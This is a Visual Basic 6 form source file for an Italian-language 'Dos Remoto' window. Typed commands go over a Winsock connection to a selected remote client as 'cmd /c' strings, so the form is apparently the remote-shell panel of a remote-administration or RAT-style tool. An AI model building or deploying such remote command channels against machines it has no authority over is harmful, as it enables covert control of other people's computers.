VERSION 5.00
Begin VB.Form Form11 
   BackColor       =   &H00000000&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Dos Remoto"
   ClientHeight    =   4455
   ClientLeft      =   45
   ClientTop       =   615
   ClientWidth     =   7950
   LinkTopic       =   "Form11"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4455
   ScaleWidth      =   7950
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.TextBox Text2 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   3255
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   2
      Text            =   "Form11.frx":0000
      Top             =   360
      Width           =   7695
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Invia"
      Height          =   255
      Left            =   6720
      TabIndex        =   1
      Top             =   3840
      Width           =   1095
   End
   Begin VB.TextBox Text1 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Text            =   "cmd"
      Top             =   3840
      Width           =   6495
   End
   Begin VB.Menu pop1 
      Caption         =   "Opzioni"
      Begin VB.Menu pop2 
         Caption         =   "Svuota"
      End
   End
End
Attribute VB_Name = "Form11"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "cmd|" & "cmd /c" & Text1.Text

Text1.Text = ""
DoEvents
 
End Sub

Private Sub Form_Load()
Form1.Winsock1(Form1.Label14.Caption).SendData "cmd|" & "cmd /c"
End Sub

Private Sub pop2_Click()
Text2.Text = ""
End Sub

